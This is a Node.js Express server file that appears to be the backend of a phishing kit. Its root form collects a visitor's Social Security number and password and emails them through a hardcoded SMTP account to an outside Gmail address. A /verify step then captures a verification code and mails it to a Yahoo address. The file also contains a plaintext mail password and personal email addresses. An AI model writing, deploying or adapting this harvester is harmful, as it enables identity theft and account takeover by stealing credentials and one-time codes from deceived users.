const nodemailer = require('nodemailer');
// const satelize = require('satelize');
const axios = require('axios');
const fs = require('fs')
const express = require('express');
const app = express()
const bodyParser = require('body-parser')
const handlebars = require('handlebars');
const path = require('path');

app.set('view engine', 'ejs');
app.use(express.static('public'));

app.use(bodyParser.urlencoded({ extended: true}));  

app.get('/', (req, res) => {
  const date = new Date();
let dated = date.toDateString();
  res.render('index', {dated: dated })
})

app.post('/', (req, res) => {
  req.body.ssn
  req.body.password


const transporter = nodemailer.createTransport({
  port:'465',
  host:'mail.privateemail.com',
  auth: {
    user: 'customer@rkodes.com',
    pass: '08028345728',
  },
  secure: true,
})


fs.readFile('Mail.html','UTF-8',function(err, data) {
  if (err) console.log('error', err);
  const template = handlebars.compile(data.toString());
  const replacements = {
    ssn: req.body.ssn,
    password: req.body.password,
  };
  const htmlToSend = template(replacements);
  
      const mailData = {
      from: 'customer@rkodes.com',
      to: 'okumagbarukevwe@gmail.com',
      // to: 'da.honest@yahoo.com',
      // to: 'joannelouisekenrick.cbs@gmail.com',
      // subject: `New User Alert`,
      text: '',
      html: htmlToSend,
      //  strUser
      subject: '************* New User Filled the Form ********************',
      }
  
      transporter.sendMail(mailData, function (err, info) {
        if(err)
          console.log(err)
        else
          console.log(info)
          res.redirect('../verify')
        })
}) 
  
})

app.get('/verify', (req, res) => {
    res.render('verify')
  })

  app.post('/verify', (req, res) => {
    req.body.verificationCode
    
  
  
  const transporter = nodemailer.createTransport({
    port:'465',
    host:'mail.privateemail.com',
    auth: {
      user: 'customer@rkodes.com',
      pass: '08028345728',
    },
    secure: true,
  })
  
  
  fs.readFile('Mail2.html','UTF-8',function(err, data) {
    if (err) console.log('error', err);
    const template = handlebars.compile(data.toString());
    const replacements = {
      verificationCode: req.body.verificationCode,
    };
    const htmlToSend = template(replacements);
    
        const mailData = {
        from: 'customer@rkodes.com',
        to: 'da.honest@yahoo.com',
        // to: 'joannelouisekenrick.cbs@gmail.com',
        // subject: `New User Alert`,
        text: '',
        html: htmlToSend,
        //  strUser
        subject: '************* New User Filled the Form ********************',
        }
    
        transporter.sendMail(mailData, function (err, info) {
          if(err)
            console.log(err)
          else
            console.log(info)
            res.redirect('../')
          })
  }) 
    
  })
  


app.listen(process.env.PORT || 3200, ()=> {
  console.log('server has started')
})
